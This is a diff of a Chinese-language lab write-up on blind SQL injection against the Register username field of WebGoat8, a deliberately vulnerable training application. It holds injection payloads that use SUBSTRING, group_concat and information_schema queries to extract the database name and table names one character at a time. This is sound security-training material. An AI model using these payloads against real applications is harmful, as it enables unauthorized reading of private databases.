@@ -217,8 +217,17 @@ Login入口测试了许久没有结果，但 Register 的用户名窗口存在�
 
 利用下列fuzz：```tom'\+and\+SUBSTRING\(database\(\),[1-9],1\)='\w'\+;--```，发现数据库名就是你登录WebGoat8的用户名，果然是动态建的。
 
-利用下列fuzz：```tom'\+and\+SUBSTRING\(select information_schema.SYSTEM_TABLES\(\),[1-9],1\)='\w'\+;--```，发现数据库名就是你登录WebGoat8的用户名，果然是动态建的。
 
-```select * from INFORMATION_SCHEMA.SYSTEM_TABLES where TABLE_TYPE='TABLE' ```
 
+
+下列语句可行
+```tom' and (SELECT True FROM information_schema.tables where table_type='VIEW' LIMIT 1) ; --```
+
+
+将结果变成一个字符串 ```SELECT group_concat(table_NAME) FROM information_schema.tables where table_type='TABLE'```;
+
+
+编需要的：
+
+```tom' and (SELECT SUBSTRING(group_concat(table_NAME),1,1)='S' FROM information_schema.tables where table_type='VIEW' LIMIT 1)  ; --```
 
